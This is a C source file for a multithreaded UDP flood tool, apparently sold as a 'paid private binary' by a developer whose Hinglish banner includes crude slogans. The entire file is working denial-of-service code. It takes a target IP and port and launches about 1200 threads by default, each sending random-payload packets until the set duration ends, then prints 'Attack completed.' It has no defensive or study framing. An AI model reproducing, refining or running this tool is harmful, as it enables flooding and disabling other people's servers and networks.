#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <math.h> // fmod ke liye

#define EXPIRATION_YEAR 2078
#define EXPIRATION_MONTH 03
#define EXPIRATION_DAY 10
#define DEFAULT_PACKET_SIZE 1200  // Default packet size (1 KB)
#define DEFAULT_THREAD_COUNT 1200   // Default number of threads

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
char *global_payload = NULL; // Shared payload buffer

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

// Function to perform the UDP flooding
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    // Time-bound attack loop
    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent_by_thread = 0;

    while (time(NULL) < end_time && keep_running) {
        sendto(sock, global_payload, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        __sync_fetch_and_add(&total_packets_sent, 1); // Thread-safe increment
        packets_sent_by_thread++;
    }

    close(sock);

    // Print the number of packets sent by this thread
    printf("\033[1;32mThread %d\033[0m sent \033[1;33m%lu packets\033[0m.\n", params->thread_id, packets_sent_by_thread);

    return NULL;
}

// Function to display stylish progress and time remaining
void display_progress(time_t start_time, int duration) {
    time_t now = time(NULL);
    int elapsed = (int)difftime(now, start_time);
    int remaining = duration - elapsed;

    if (remaining < 0) remaining = 0;

    // Clear the current line
    printf("\033[2K\r");

    // Print time remaining and total packets sent
    printf("\033[1;36mTime Remaining:\033[0m \033[1;35m%02d:%02d\033[0m\n", remaining / 60, remaining % 60);
    printf("\033[1;34mTotal Packets Sent:\033[0m \033[1;35m%lu\033[0m\n", total_packets_sent);

    fflush(stdout); // Flush the output to update the line
}

// Stylish printout function with real-time expiry
void print_stylish_text() {
    // Get the current time
    time_t now;
    time(&now);

    // Calculate expiry time
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900; // Year since 1900
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;    // Month (0-11)
    expiry_date.tm_mday = EXPIRATION_DAY;         // Day of the month
    time_t expiry_time = mktime(&expiry_date);

    // Calculate remaining time
    double remaining_seconds = difftime(expiry_time, now);
    int remaining_days = (int)(remaining_seconds / (60 * 60 * 24));
    int remaining_hours = (int)fmod((remaining_seconds / (60 * 60)), 24); // Use fmod for double
    int remaining_minutes = (int)fmod((remaining_seconds / 60), 60);      // Use fmod for double
    int remaining_seconds_int = (int)fmod(remaining_seconds, 60);         // Use fmod for double

    printf("\n");
    printf("\033[1;35m╔════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║ \033[1;36m★ \033[1;32mNOOB AM \033[1;36m★ \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ DEVELOPED BY: \033[1;32m@NOOB_AM \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ EXPIRY TIME: \033[1;32m%d days, %02d:%02d:%02d \033[1;35m║\033[0m\n", remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);
    printf("\033[1;35m║ \033[1;33m✦ AAGYA TERA BAAP BY: \033[1;32mNOOB \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ PAID BINARY HAI BHAI \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;31m✦ ! [ FULL PRIVATE BINARY] \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ BIMARY LENA H TO NOOB AM KO DM KRNA HOGA \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ CONTACT: \033[1;32m@NOOB_AM \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;36m★ \033[1;32mGAMD FAAD \033[1;36m★ \033[1;35m║\033[0m\n");
    printf("\033[1;35m╚════════════════════════════════════════╝\033[0m\n\n");
}

int main(int argc, char *argv[]) {
    // Print stylish text
    print_stylish_text();

    // Get the current time
    time_t now;
    time(&now);

    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("\033[1;31mExpired. khatam ho gya h developar se connect kr @NOOB_AM.\033[0m\n");
        return EXIT_FAILURE;
    }

    // Check for minimum arguments (IP and PORT are mandatory)
    if (argc < 3) {
        printf("\033[1;33mExample: %s 192.168.1.1 80 60 \033[0m\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60; // Default duration: 60 seconds
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE; // Default packet size
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT; // Default thread count

    if (packet_size <= 0 || thread_count <= 0) {
        printf("\033[1;31mInvalid packet size or thread count. Using defaults.\033[0m\n");
        packet_size = DEFAULT_PACKET_SIZE;
        thread_count = DEFAULT_THREAD_COUNT;
    }

    signal(SIGINT, handle_signal);

    // Allocate and pre-generate the shared payload
    global_payload = (char *)malloc(packet_size);
    if (!global_payload) {
        perror("\033[1;31mFailed to allocate memory for payload\033[0m");
        return EXIT_FAILURE;
    }
    generate_random_payload(global_payload, packet_size);

    pthread_t threads[thread_count];
    attack_params params[thread_count];

    time_t start_time = time(NULL);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    // Display progress while threads are running
    while (keep_running && time(NULL) < start_time + duration) {
        display_progress(start_time, duration);
        usleep(100000); // Update every 100ms (0.1 seconds)
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;32mAttack completed.\033[0m \033[1;34mTotal packets sent:\033[0m \033[1;35m%lu\033[0m\n", total_packets_sent);

    free(global_payload); // Free the shared payload
    return 0;
}